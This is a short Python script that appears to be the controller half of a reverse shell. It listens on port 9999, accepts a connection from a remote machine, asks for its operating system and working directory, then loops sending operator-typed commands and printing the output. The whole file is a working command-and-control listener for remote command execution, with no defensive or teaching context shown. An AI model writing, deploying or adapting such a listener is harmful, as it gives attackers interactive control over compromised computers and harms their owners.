import socket
import sys


def create_socket():
    try:
        global host
        global port
        global skt
        host =""
        port =9999
        skt = socket.socket()
    except socket.error as msg:
        print("Socket Creation Error: "+ str(msg)+"\n")


def bind_sockets():
    try:
        global host
        global port
        global skt

        print("Binding the port: "+ str(port) +" .....\n")
        skt.bind((host, port))
        skt.listen(5)

    except socket.error as msg:
        print("Socket binding error: "+ str(msg)+"\nRetrying...")
        bind_sockets()


def socket_accept():
    conn, address = skt.accept()
    print("Connection established | Ip: " + address[0] + " port: " + str(address[1]))

    #here goes all commands
    os_version = os_checker(conn)
    print("OS version: "+ os_version + "\n")
    send_commands(conn)
    conn.close()


def path_finder(conn):
    cmd = "pwd"
    conn.send(str.encode(cmd))
    client_response = str(conn.recv(1048576), "utf-8")
    out_path = client_response[2:-1].rstrip('\\n')
    return out_path


def os_checker(conn):
    cmd = "platform"
    conn.send(str.encode(cmd))
    client_response = str(conn.recv(1048576), "utf-8")
    out_os = client_response.rstrip('\\n')
    return out_os


def send_commands(conn):

    while True:
        cmd = input(path_finder(conn)+">>")
        if cmd == "quit":
            conn.close()
            skt.close()
            sys.exit()
        if len(str.encode(cmd))>0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1048576), "utf-8")
            #print(client_response, end="")
            pattern_remover(client_response)


def pattern_remover(client_response):
    output_data = client_response[2:-1].replace('\\n', "^")
    for ch in output_data:
        if ch == '^':
            print("")
        else:
            print(ch, end="")


def main():
    create_socket()
    bind_sockets()
    socket_accept()


main()
